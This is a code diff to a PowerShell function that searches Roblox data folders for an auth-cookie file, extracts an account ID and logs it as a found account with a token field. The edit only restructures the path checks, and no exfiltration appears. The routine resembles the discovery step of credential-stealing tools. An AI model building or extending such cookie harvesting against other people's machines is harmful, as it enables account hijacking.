@@ -125,23 +125,26 @@ function Scan-RobloxAccounts {
     foreach ($path in $robloxPaths) {
         if (Test-Path $path) {
             # Check for auth cookies
-            $authFile = Join-Path -Path $path -ChildPath "Cookies" -AdditionalChildPath "auth.rbx"
-            if (Test-Path $authFile) {
-                $content = Get-Content $authFile -Raw
-                
-                if ($content -match '(\w{8}-\w{4}-\w{4}-\w{4}-\w{12})') {
-                    $userId = $matches[1]
+            $cookiesPath = Join-Path -Path $path -ChildPath "Cookies"
+            if (Test-Path $cookiesPath) {
+                $authFile = Join-Path -Path $cookiesPath -ChildPath "auth.rbx"
+                if (Test-Path $authFile) {
+                    $content = Get-Content $authFile -Raw
                     
-                    $account = @{
-                        Type = "Roblox"
-                        ID = $userId
-                        Username = "Unknown"
-                        Discriminator = "Unknown"
-                        Token = "Auth Cookie"
-                        Path = $authFile
-                        Status = "Found"
+                    if ($content -match '(\w{8}-\w{4}-\w{4}-\w{4}-\w{12})') {
+                        $userId = $matches[1]
+                        
+                        $account = @{
+                            Type = "Roblox"
+                            ID = $userId
+                            Username = "Unknown"
+                            Discriminator = "Unknown"
+                            Token = "Auth Cookie"
+                            Path = $authFile
+                            Status = "Found"
+                        }
+                        $accounts += $account
                     }
-                    $accounts += $account
                 }
             }
         }
